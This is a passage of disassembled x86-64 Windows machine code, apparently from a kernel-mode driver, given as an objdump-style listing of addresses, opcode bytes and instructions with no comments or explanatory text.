   1400016d8:	48 8b 4c c1 f8       	mov    -0x8(%rcx,%rax,8),%rcx
   1400016dd:	e8 c2 1b 00 00       	call   0x1400032a4
   1400016e2:	83 c9 ff             	or     $0xffffffff,%ecx
   1400016e5:	85 c0                	test   %eax,%eax
   1400016e7:	0f 49 4c 24 30       	cmovns 0x30(%rsp),%ecx
   1400016ec:	8b c1                	mov    %ecx,%eax
   1400016ee:	48 83 c4 28          	add    $0x28,%rsp
   1400016f2:	c3                   	ret
   1400016f3:	cc                   	int3
   1400016f4:	48 83 ec 38          	sub    $0x38,%rsp
   1400016f8:	48 63 c1             	movslq %ecx,%rax
   1400016fb:	48 8d 0d 5e 8a 00 00 	lea    0x8a5e(%rip),%rcx        # 0x14000a160
   140001702:	48 8b 4c c1 f8       	mov    -0x8(%rcx,%rax,8),%rcx
   140001707:	48 63 44 24 60       	movslq 0x60(%rsp),%rax
   14000170c:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001711:	e8 aa 1c 00 00       	call   0x1400033c0
   140001716:	33 c9                	xor    %ecx,%ecx
   140001718:	85 c0                	test   %eax,%eax
   14000171a:	0f 99 c1             	setns  %cl
   14000171d:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140001720:	48 83 c4 38          	add    $0x38,%rsp
   140001724:	c3                   	ret
   140001725:	cc                   	int3
   140001726:	cc                   	int3
   140001727:	cc                   	int3
   140001728:	48 83 ec 28          	sub    $0x28,%rsp
   14000172c:	45 8b c8             	mov    %r8d,%r9d
   14000172f:	44 0f b7 c2          	movzwl %dx,%r8d
   140001733:	0f b7 d1             	movzwl %cx,%edx
   140001736:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   14000173b:	e8 a0 18 00 00       	call   0x140002fe0
   140001740:	85 c0                	test   %eax,%eax
   140001742:	78 2b                	js     0x14000176f
   140001744:	8b 0d 16 ca 00 00    	mov    0xca16(%rip),%ecx        # 0x14000e160
   14000174a:	8b d1                	mov    %ecx,%edx
   14000174c:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140001751:	81 e2 ff 07 00 00    	and    $0x7ff,%edx
   140001757:	ff c1                	inc    %ecx
   140001759:	89 0d 01 ca 00 00    	mov    %ecx,0xca01(%rip)        # 0x14000e160
   14000175f:	48 8d 0d fa 89 00 00 	lea    0x89fa(%rip),%rcx        # 0x14000a160
   140001766:	48 89 04 d1          	mov    %rax,(%rcx,%rdx,8)
   14000176a:	8d 42 01             	lea    0x1(%rdx),%eax
   14000176d:	eb 03                	jmp    0x140001772
   14000176f:	83 c8 ff             	or     $0xffffffff,%eax
   140001772:	48 83 c4 28          	add    $0x28,%rsp
   140001776:	c3                   	ret
   140001777:	cc                   	int3
   140001778:	40 55                	rex push %rbp
   14000177a:	48 8d ac 24 b0 fb ff 	lea    -0x450(%rsp),%rbp
   140001781:	ff 
   140001782:	48 81 ec 50 05 00 00 	sub    $0x550,%rsp
   140001789:	48 8b 05 50 89 00 00 	mov    0x8950(%rip),%rax        # 0x14000a0e0
   140001790:	48 33 c4             	xor    %rsp,%rax
   140001793:	48 89 85 40 04 00 00 	mov    %rax,0x440(%rbp)
   14000179a:	33 d2                	xor    %edx,%edx
   14000179c:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   1400017a0:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   1400017a6:	e8 95 59 00 00       	call   0x140007140
   1400017ab:	33 d2                	xor    %edx,%edx
   1400017ad:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400017b2:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   1400017b8:	e8 83 59 00 00       	call   0x140007140
   1400017bd:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400017c0:	48 8d 4d 40          	lea    0x40(%rbp),%rcx
   1400017c4:	ba 00 04 00 00       	mov    $0x400,%edx
   1400017c9:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400017ce:	e8 a5 04 00 00       	call   0x140001c78
   1400017d3:	84 c0                	test   %al,%al
   1400017d5:	74 5b                	je     0x140001832
   1400017d7:	48 8d 55 40          	lea    0x40(%rbp),%rdx
   1400017db:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400017e0:	ff 15 5a 6b 00 00    	call   *0x6b5a(%rip)        # 0x140008340
   1400017e6:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400017eb:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   1400017f0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400017f5:	e8 be 07 00 00       	call   0x140001fb8
   1400017fa:	85 c0                	test   %eax,%eax
   1400017fc:	78 34                	js     0x140001832
   1400017fe:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140001803:	48 85 c9             	test   %rcx,%rcx
   140001806:	74 2a                	je     0x140001832
   140001808:	8b 54 24 20          	mov    0x20(%rsp),%edx
   14000180c:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001811:	e8 ae 24 00 00       	call   0x140003cc4
   140001816:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000181b:	ba 57 45 4e 45       	mov    $0x454e4557,%edx
   140001820:	ff 15 e2 6a 00 00    	call   *0x6ae2(%rip)        # 0x140008308
   140001826:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000182b:	e8 68 43 00 00       	call   0x140005b98
   140001830:	eb 02                	jmp    0x140001834
   140001832:	32 c0                	xor    %al,%al
   140001834:	48 8b 8d 40 04 00 00 	mov    0x440(%rbp),%rcx
   14000183b:	48 33 cc             	xor    %rsp,%rcx
   14000183e:	e8 ed 57 00 00       	call   0x140007030
   140001843:	48 81 c4 50 05 00 00 	add    $0x550,%rsp
   14000184a:	5d                   	pop    %rbp
   14000184b:	c3                   	ret
   14000184c:	48 83 ec 28          	sub    $0x28,%rsp
   140001850:	80 3d 11 c9 00 00 00 	cmpb   $0x0,0xc911(%rip)        # 0x14000e168
   140001857:	74 04                	je     0x14000185d
   140001859:	b0 01                	mov    $0x1,%al
   14000185b:	eb 1a                	jmp    0x140001877
   14000185d:	e8 72 03 00 00       	call   0x140001bd4
   140001862:	84 c0                	test   %al,%al
   140001864:	74 0b                	je     0x140001871
   140001866:	e8 51 00 00 00       	call   0x1400018bc
   14000186b:	88 05 f7 c8 00 00    	mov    %al,0xc8f7(%rip)        # 0x14000e168
   140001871:	8a 05 f1 c8 00 00    	mov    0xc8f1(%rip),%al        # 0x14000e168
   140001877:	48 83 c4 28          	add    $0x28,%rsp
   14000187b:	c3                   	ret
   14000187c:	48 83 ec 38          	sub    $0x38,%rsp
   140001880:	80 3d e1 c8 00 00 00 	cmpb   $0x0,0xc8e1(%rip)        # 0x14000e168
   140001887:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000188a:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   14000188f:	74 24                	je     0x1400018b5
   140001891:	48 8b 15 d8 c8 00 00 	mov    0xc8d8(%rip),%rdx        # 0x14000e170
   140001898:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000189d:	ff 15 9d 6a 00 00    	call   *0x6a9d(%rip)        # 0x140008340
   1400018a3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400018a8:	ff 15 52 6a 00 00    	call   *0x6a52(%rip)        # 0x140008300
   1400018ae:	c6 05 b3 c8 00 00 00 	movb   $0x0,0xc8b3(%rip)        # 0x14000e168
   1400018b5:	48 83 c4 38          	add    $0x38,%rsp
   1400018b9:	c3                   	ret
   1400018ba:	cc                   	int3
   1400018bb:	cc                   	int3
   1400018bc:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400018c1:	55                   	push   %rbp
   1400018c2:	48 8d 6c 24 f0       	lea    -0x10(%rsp),%rbp
   1400018c7:	48 81 ec 10 01 00 00 	sub    $0x110,%rsp
   1400018ce:	48 8b 15 ab c8 00 00 	mov    0xc8ab(%rip),%rdx        # 0x14000e180
   1400018d5:	4c 8d 05 a4 6e 00 00 	lea    0x6ea4(%rip),%r8        # 0x140008780
   1400018dc:	48 8b 05 a5 0c 01 00 	mov    0x10ca5(%rip),%rax        # 0x140012588
   1400018e3:	48 8b 0d 5e 18 01 00 	mov    0x1185e(%rip),%rcx        # 0x140013148
   1400018ea:	ff 15 78 6a 00 00    	call   *0x6a78(%rip)        # 0x140008368
   1400018f0:	48 89 45 20          	mov    %rax,0x20(%rbp)
   1400018f4:	48 85 c0             	test   %rax,%rax
   1400018f7:	75 07                	jne    0x140001900
   1400018f9:	32 c0                	xor    %al,%al
   1400018fb:	e9 7d 02 00 00       	jmp    0x140001b7d
   140001900:	48 8b 15 69 c8 00 00 	mov    0xc869(%rip),%rdx        # 0x14000e170
   140001907:	48 8d 4d 90          	lea    -0x70(%rbp),%rcx
   14000190b:	ff 15 2f 6a 00 00    	call   *0x6a2f(%rip)        # 0x140008340
   140001911:	48 8b 15 60 c8 00 00 	mov    0xc860(%rip),%rdx        # 0x14000e178
   140001918:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   14000191c:	ff 15 1e 6a 00 00    	call   *0x6a1e(%rip)        # 0x140008340
   140001922:	48 8b 05 a7 0d 01 00 	mov    0x10da7(%rip),%rax        # 0x1400126d0
   140001929:	41 b8 12 00 00 00    	mov    $0x12,%r8d
   14000192f:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001933:	48 8b 0d 0e 18 01 00 	mov    0x1180e(%rip),%rcx        # 0x140013148
   14000193a:	ff 15 28 6a 00 00    	call   *0x6a28(%rip)        # 0x140008368
   140001940:	48 8b 05 61 0d 01 00 	mov    0x10d61(%rip),%rax        # 0x1400126a8
   140001947:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000194d:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001951:	48 8b 0d f0 17 01 00 	mov    0x117f0(%rip),%rcx        # 0x140013148
   140001958:	ff 15 0a 6a 00 00    	call   *0x6a0a(%rip)        # 0x140008368
   14000195e:	48 8b 05 4b 0d 01 00 	mov    0x10d4b(%rip),%rax        # 0x1400126b0
   140001965:	41 b0 01             	mov    $0x1,%r8b
   140001968:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   14000196c:	48 8b 0d d5 17 01 00 	mov    0x117d5(%rip),%rcx        # 0x140013148
   140001973:	ff 15 ef 69 00 00    	call   *0x69ef(%rip)        # 0x140008368
   140001979:	48 8b 05 58 0d 01 00 	mov    0x10d58(%rip),%rax        # 0x1400126d8
   140001980:	4c 8d 45 90          	lea    -0x70(%rbp),%r8
   140001984:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001988:	48 8b 0d b9 17 01 00 	mov    0x117b9(%rip),%rcx        # 0x140013148
   14000198f:	ff 15 d3 69 00 00    	call   *0x69d3(%rip)        # 0x140008368
   140001995:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001999:	48 8b 0d a8 17 01 00 	mov    0x117a8(%rip),%rcx        # 0x140013148
   1400019a0:	85 c0                	test   %eax,%eax
   1400019a2:	79 12                	jns    0x1400019b6
   1400019a4:	48 8b 05 c5 0c 01 00 	mov    0x10cc5(%rip),%rax        # 0x140012670
   1400019ab:	ff 15 b7 69 00 00    	call   *0x69b7(%rip)        # 0x140008368
   1400019b1:	e9 43 ff ff ff       	jmp    0x1400018f9
   1400019b6:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400019b9:	c7 44 24 68 28 00 00 	movl   $0x28,0x68(%rsp)
   1400019c0:	00 
   1400019c1:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   1400019c6:	48 8d 05 93 02 00 00 	lea    0x293(%rip),%rax        # 0x140001c60
   1400019cd:	c7 45 8c 04 00 00 00 	movl   $0x4,-0x74(%rbp)
   1400019d4:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   1400019d9:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   1400019de:	48 8d 05 6b 02 00 00 	lea    0x26b(%rip),%rax        # 0x140001c50
   1400019e5:	c7 44 24 4c 04 00 00 	movl   $0x4,0x4c(%rsp)
   1400019ec:	00 
   1400019ed:	48 89 44 24 78       	mov    %rax,0x78(%rsp)
   1400019f2:	4c 8d 44 24 68       	lea    0x68(%rsp),%r8
   1400019f7:	48 8d 05 52 02 00 00 	lea    0x252(%rip),%rax        # 0x140001c50
   1400019fe:	be 02 00 00 00       	mov    $0x2,%esi
   140001a03:	48 89 45 80          	mov    %rax,-0x80(%rbp)
   140001a07:	33 c0                	xor    %eax,%eax
   140001a09:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001a0e:	48 8b 05 e3 0c 01 00 	mov    0x10ce3(%rip),%rax        # 0x1400126f8
   140001a15:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140001a1a:	89 75 88             	mov    %esi,-0x78(%rbp)
   140001a1d:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140001a22:	c7 44 24 30 38 00 00 	movl   $0x38,0x30(%rsp)
   140001a29:	00 
   140001a2a:	89 74 24 48          	mov    %esi,0x48(%rsp)
   140001a2e:	ff 15 34 69 00 00    	call   *0x6934(%rip)        # 0x140008368
   140001a34:	48 8b 0d 0d 17 01 00 	mov    0x1170d(%rip),%rcx        # 0x140013148
   140001a3b:	4c 8d 0d 46 c7 00 00 	lea    0xc746(%rip),%r9        # 0x14000e188
   140001a42:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001a45:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140001a4a:	33 c0                	xor    %eax,%eax
   140001a4c:	48 8d 55 20          	lea    0x20(%rbp),%rdx
   140001a50:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140001a55:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001a5a:	48 8b 05 b7 0c 01 00 	mov    0x10cb7(%rip),%rax        # 0x140012718
   140001a61:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140001a66:	c7 44 24 30 38 00 00 	movl   $0x38,0x30(%rsp)
   140001a6d:	00 
   140001a6e:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140001a73:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   140001a7a:	00 
   140001a7b:	c7 44 24 4c 01 00 00 	movl   $0x1,0x4c(%rsp)
   140001a82:	00 
   140001a83:	ff 15 df 68 00 00    	call   *0x68df(%rip)        # 0x140008368
   140001a89:	85 c0                	test   %eax,%eax
   140001a8b:	79 10                	jns    0x140001a9d
   140001a8d:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001a91:	48 8b 0d b0 16 01 00 	mov    0x116b0(%rip),%rcx        # 0x140013148
   140001a98:	e9 07 ff ff ff       	jmp    0x1400019a4
   140001a9d:	33 d2                	xor    %edx,%edx
   140001a9f:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   140001aa3:	44 8d 42 58          	lea    0x58(%rdx),%r8d
   140001aa7:	e8 94 56 00 00       	call   0x140007140
   140001aac:	48 8b 15 d5 c6 00 00 	mov    0xc6d5(%rip),%rdx        # 0x14000e188
   140001ab3:	48 8d 05 d6 00 00 00 	lea    0xd6(%rip),%rax        # 0x140001b90
   140001aba:	83 4d 00 ff          	orl    $0xffffffff,0x0(%rbp)
   140001abe:	48 8d 4d 28          	lea    0x28(%rbp),%rcx
   140001ac2:	48 83 65 c8 00       	andq   $0x0,-0x38(%rbp)
   140001ac7:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140001acc:	48 83 65 d0 00       	andq   $0x0,-0x30(%rbp)
   140001ad1:	4c 8d 45 b0          	lea    -0x50(%rbp),%r8
   140001ad5:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001ad8:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140001adc:	33 c0                	xor    %eax,%eax
   140001ade:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140001ae3:	48 8b 0d 5e 16 01 00 	mov    0x1165e(%rip),%rcx        # 0x140013148
   140001aea:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140001aef:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140001af4:	48 8b 05 85 0e 01 00 	mov    0x10e85(%rip),%rax        # 0x140012980
   140001afb:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140001b00:	c7 45 b0 58 00 00 00 	movl   $0x58,-0x50(%rbp)
   140001b07:	89 75 b8             	mov    %esi,-0x48(%rbp)
   140001b0a:	c6 45 bd 01          	movb   $0x1,-0x43(%rbp)
   140001b0e:	89 75 b4             	mov    %esi,-0x4c(%rbp)
   140001b11:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140001b16:	c7 44 24 30 38 00 00 	movl   $0x38,0x30(%rsp)
   140001b1d:	00 
   140001b1e:	89 74 24 48          	mov    %esi,0x48(%rsp)
   140001b22:	c7 44 24 4c 04 00 00 	movl   $0x4,0x4c(%rsp)
   140001b29:	00 
   140001b2a:	ff 15 38 68 00 00    	call   *0x6838(%rip)        # 0x140008368
   140001b30:	48 8b 0d 11 16 01 00 	mov    0x11611(%rip),%rcx        # 0x140013148
   140001b37:	85 c0                	test   %eax,%eax
   140001b39:	79 09                	jns    0x140001b44
   140001b3b:	48 8b 55 20          	mov    0x20(%rbp),%rdx
   140001b3f:	e9 60 fe ff ff       	jmp    0x1400019a4
   140001b44:	48 8b 15 3d c6 00 00 	mov    0xc63d(%rip),%rdx        # 0x14000e188
   140001b4b:	4c 8d 45 a0          	lea    -0x60(%rbp),%r8
   140001b4f:	48 8b 05 ea 0b 01 00 	mov    0x10bea(%rip),%rax        # 0x140012740
   140001b56:	ff 15 0c 68 00 00    	call   *0x680c(%rip)        # 0x140008368
   140001b5c:	48 8b 0d e5 15 01 00 	mov    0x115e5(%rip),%rcx        # 0x140013148
   140001b63:	85 c0                	test   %eax,%eax
   140001b65:	78 d4                	js     0x140001b3b
   140001b67:	48 8b 05 2a 0a 01 00 	mov    0x10a2a(%rip),%rax        # 0x140012598
   140001b6e:	48 8b 15 13 c6 00 00 	mov    0xc613(%rip),%rdx        # 0x14000e188
   140001b75:	ff 15 ed 67 00 00    	call   *0x67ed(%rip)        # 0x140008368
   140001b7b:	b0 01                	mov    $0x1,%al
   140001b7d:	48 8b b4 24 30 01 00 	mov    0x130(%rsp),%rsi
   140001b84:	00 
   140001b85:	48 81 c4 10 01 00 00 	add    $0x110,%rsp
   140001b8c:	5d                   	pop    %rbp
   140001b8d:	c3                   	ret
   140001b8e:	cc                   	int3
   140001b8f:	cc                   	int3
   140001b90:	48 8b 05 61 11 01 00 	mov    0x11161(%rip),%rax        # 0x140012cf8
   140001b97:	41 b8 01 00 00 c0    	mov    $0xc0000001,%r8d
   140001b9d:	48 8b 0d a4 15 01 00 	mov    0x115a4(%rip),%rcx        # 0x140013148
   140001ba4:	48 ff 25 bd 67 00 00 	rex.W jmp *0x67bd(%rip)        # 0x140008368
   140001bab:	cc                   	int3
   140001bac:	80 3d b5 c5 00 00 00 	cmpb   $0x0,0xc5b5(%rip)        # 0x14000e168
   140001bb3:	75 03                	jne    0x140001bb8
   140001bb5:	33 c0                	xor    %eax,%eax
   140001bb7:	c3                   	ret
   140001bb8:	48 8b 15 c9 c5 00 00 	mov    0xc5c9(%rip),%rdx        # 0x14000e188
   140001bbf:	48 8b 05 f2 09 01 00 	mov    0x109f2(%rip),%rax        # 0x1400125b8
   140001bc6:	48 8b 0d 7b 15 01 00 	mov    0x1157b(%rip),%rcx        # 0x140013148
   140001bcd:	48 ff 25 94 67 00 00 	rex.W jmp *0x6794(%rip)        # 0x140008368
   140001bd4:	48 8b c4             	mov    %rsp,%rax
   140001bd7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001bdb:	57                   	push   %rdi
   140001bdc:	48 83 ec 60          	sub    $0x60,%rsp
   140001be0:	48 83 60 f0 00       	andq   $0x0,-0x10(%rax)
   140001be5:	48 8b fa             	mov    %rdx,%rdi
   140001be8:	83 60 dc 00          	andl   $0x0,-0x24(%rax)
   140001bec:	48 8d 15 8d c5 00 00 	lea    0xc58d(%rip),%rdx        # 0x14000e180
   140001bf3:	48 83 60 e0 00       	andq   $0x0,-0x20(%rax)
   140001bf8:	45 33 c9             	xor    %r9d,%r9d
   140001bfb:	83 48 f0 01          	orl    $0x1,-0x10(%rax)
   140001bff:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
   140001c04:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140001c09:	4c 89 40 e8          	mov    %r8,-0x18(%rax)
   140001c0d:	4c 8b c7             	mov    %rdi,%r8
   140001c10:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   140001c15:	48 8b d1             	mov    %rcx,%rdx
   140001c18:	48 8b 0d 29 15 01 00 	mov    0x11529(%rip),%rcx        # 0x140013148
   140001c1f:	c7 40 d8 20 00 00 00 	movl   $0x20,-0x28(%rax)
   140001c26:	48 8b 05 33 0c 01 00 	mov    0x10c33(%rip),%rax        # 0x140012860
   140001c2d:	ff 15 35 67 00 00    	call   *0x6735(%rip)        # 0x140008368
   140001c33:	48 8b cf             	mov    %rdi,%rcx
   140001c36:	8b d8                	mov    %eax,%ebx
   140001c38:	e8 1f 01 00 00       	call   0x140001d5c
   140001c3d:	85 db                	test   %ebx,%ebx
   140001c3f:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140001c44:	0f 99 c0             	setns  %al
   140001c47:	48 83 c4 60          	add    $0x60,%rsp
   140001c4b:	5f                   	pop    %rdi
   140001c4c:	c3                   	ret
   140001c4d:	cc                   	int3
   140001c4e:	cc                   	int3
   140001c4f:	cc                   	int3
   140001c50:	c2 00 00             	ret    $0x0
   140001c53:	cc                   	int3
   140001c54:	cc                   	int3
   140001c55:	cc                   	int3
   140001c56:	cc                   	int3
   140001c57:	cc                   	int3
   140001c58:	cc                   	int3
   140001c59:	cc                   	int3
   140001c5a:	cc                   	int3
   140001c5b:	cc                   	int3
   140001c5c:	cc                   	int3
   140001c5d:	cc                   	int3
   140001c5e:	cc                   	int3
   140001c5f:	cc                   	int3
   140001c60:	48 8b 05 91 10 01 00 	mov    0x11091(%rip),%rax        # 0x140012cf8
   140001c67:	45 33 c0             	xor    %r8d,%r8d
   140001c6a:	48 8b 0d d7 14 01 00 	mov    0x114d7(%rip),%rcx        # 0x140013148
   140001c71:	48 ff 25 f0 66 00 00 	rex.W jmp *0x66f0(%rip)        # 0x140008368
   140001c78:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001c7d:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140001c82:	56                   	push   %rsi
   140001c83:	57                   	push   %rdi
   140001c84:	41 56                	push   %r14
   140001c86:	48 83 ec 20          	sub    $0x20,%rsp
   140001c8a:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   140001c90:	45 32 f6             	xor    %r14b,%r14b
   140001c93:	8b da                	mov    %edx,%ebx
   140001c95:	48 8b f1             	mov    %rcx,%rsi
   140001c98:	48 85 c9             	test   %rcx,%rcx
   140001c9b:	0f 84 94 00 00 00    	je     0x140001d35
   140001ca1:	85 d2                	test   %edx,%edx
   140001ca3:	0f 84 8c 00 00 00    	je     0x140001d35
   140001ca9:	48 8b 15 d0 c4 00 00 	mov    0xc4d0(%rip),%rdx        # 0x14000e180
   140001cb0:	48 8b 05 b1 0b 01 00 	mov    0x10bb1(%rip),%rax        # 0x140012868
   140001cb7:	48 8b 0d 8a 14 01 00 	mov    0x1148a(%rip),%rcx        # 0x140013148
   140001cbe:	ff 15 a4 66 00 00    	call   *0x66a4(%rip)        # 0x140008368
   140001cc4:	48 8b c8             	mov    %rax,%rcx
   140001cc7:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001ccc:	48 8d 15 1d 58 00 00 	lea    0x581d(%rip),%rdx        # 0x1400074f0
   140001cd3:	e8 b8 4f 00 00       	call   0x140006c90
   140001cd8:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140001cdd:	85 c0                	test   %eax,%eax
   140001cdf:	78 3f                	js     0x140001d20
   140001ce1:	48 8d 6f 0c          	lea    0xc(%rdi),%rbp
   140001ce5:	48 85 ed             	test   %rbp,%rbp
   140001ce8:	74 36                	je     0x140001d20
   140001cea:	8b 47 08             	mov    0x8(%rdi),%eax
   140001ced:	85 c0                	test   %eax,%eax
   140001cef:	74 2f                	je     0x140001d20
   140001cf1:	3b d8                	cmp    %eax,%ebx
   140001cf3:	76 2b                	jbe    0x140001d20
   140001cf5:	44 8b c3             	mov    %ebx,%r8d
   140001cf8:	33 d2                	xor    %edx,%edx
   140001cfa:	48 8b ce             	mov    %rsi,%rcx
   140001cfd:	e8 3e 54 00 00       	call   0x140007140
   140001d02:	8b 47 08             	mov    0x8(%rdi),%eax
   140001d05:	48 8b d5             	mov    %rbp,%rdx
   140001d08:	48 8b ce             	mov    %rsi,%rcx
   140001d0b:	3b d8                	cmp    %eax,%ebx
   140001d0d:	76 05                	jbe    0x140001d14
   140001d0f:	44 8b c0             	mov    %eax,%r8d
   140001d12:	eb 04                	jmp    0x140001d18
   140001d14:	44 8d 43 ff          	lea    -0x1(%rbx),%r8d
   140001d18:	e8 23 55 00 00       	call   0x140007240
   140001d1d:	41 b6 01             	mov    $0x1,%r14b
   140001d20:	48 85 ff             	test   %rdi,%rdi
   140001d23:	74 0b                	je     0x140001d30
   140001d25:	33 d2                	xor    %edx,%edx
   140001d27:	48 8b cf             	mov    %rdi,%rcx
   140001d2a:	ff 15 d8 65 00 00    	call   *0x65d8(%rip)        # 0x140008308
   140001d30:	41 8a c6             	mov    %r14b,%al
   140001d33:	eb 02                	jmp    0x140001d37
   140001d35:	32 c0                	xor    %al,%al
   140001d37:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140001d3c:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   140001d41:	48 83 c4 20          	add    $0x20,%rsp
   140001d45:	41 5e                	pop    %r14
   140001d47:	5f                   	pop    %rdi
   140001d48:	5e                   	pop    %rsi
   140001d49:	c3                   	ret
   140001d4a:	cc                   	int3
   140001d4b:	cc                   	int3
   140001d4c:	48 89 0d 1d c4 00 00 	mov    %rcx,0xc41d(%rip)        # 0x14000e170
   140001d53:	48 89 15 1e c4 00 00 	mov    %rdx,0xc41e(%rip)        # 0x14000e178
   140001d5a:	c3                   	ret
   140001d5b:	cc                   	int3
   140001d5c:	48 83 ec 38          	sub    $0x38,%rsp
   140001d60:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001d64:	4c 8d 0d 95 82 00 00 	lea    0x8295(%rip),%r9        # 0x14000a000
   140001d6b:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001d71:	48 8d 15 90 66 00 00 	lea    0x6690(%rip),%rdx        # 0x140008408
   140001d78:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   140001d7d:	e8 0a 50 00 00       	call   0x140006d8c
   140001d82:	48 83 c4 38          	add    $0x38,%rsp
   140001d86:	c3                   	ret
   140001d87:	cc                   	int3
   140001d88:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001d8d:	57                   	push   %rdi
   140001d8e:	48 83 ec 20          	sub    $0x20,%rsp
   140001d92:	ba 80 00 10 00       	mov    $0x100080,%edx
   140001d97:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140001d9d:	bb 34 00 00 c0       	mov    $0xc0000034,%ebx
   140001da2:	e8 1d 01 00 00       	call   0x140001ec4
   140001da7:	48 8b f8             	mov    %rax,%rdi
   140001daa:	48 85 c0             	test   %rax,%rax
   140001dad:	74 13                	je     0x140001dc2
   140001daf:	48 8b c8             	mov    %rax,%rcx
   140001db2:	e8 9d 04 00 00       	call   0x140002254
   140001db7:	48 8b cf             	mov    %rdi,%rcx
   140001dba:	8b d8                	mov    %eax,%ebx
   140001dbc:	ff 15 86 63 00 00    	call   *0x6386(%rip)        # 0x140008148
   140001dc2:	8b c3                	mov    %ebx,%eax
   140001dc4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001dc9:	48 83 c4 20          	add    $0x20,%rsp
   140001dcd:	5f                   	pop    %rdi
   140001dce:	c3                   	ret
   140001dcf:	cc                   	int3
   140001dd0:	40 55                	rex push %rbp
   140001dd2:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   140001dd7:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
   140001dde:	48 8b 05 fb 82 00 00 	mov    0x82fb(%rip),%rax        # 0x14000a0e0
   140001de5:	48 33 c4             	xor    %rsp,%rax
   140001de8:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140001dec:	48 83 65 d7 00       	andq   $0x0,-0x29(%rbp)
   140001df1:	4c 8d 4d df          	lea    -0x21(%rbp),%r9
   140001df5:	c7 44 24 68 00 01 00 	movl   $0x100,0x68(%rsp)
   140001dfc:	00 
   140001dfd:	33 c0                	xor    %eax,%eax
   140001dff:	48 21 44 24 60       	and    %rax,0x60(%rsp)
   140001e04:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001e07:	21 44 24 58          	and    %eax,0x58(%rsp)
   140001e0b:	21 44 24 50          	and    %eax,0x50(%rsp)
   140001e0f:	48 21 44 24 48       	and    %rax,0x48(%rsp)
   140001e14:	48 21 45 f7          	and    %rax,-0x9(%rbp)
   140001e18:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   140001e1f:	00 
   140001e20:	c7 44 24 38 02 00 00 	movl   $0x2,0x38(%rsp)
   140001e27:	00 
   140001e28:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140001e2d:	4c 8d 45 ef          	lea    -0x11(%rbp),%r8
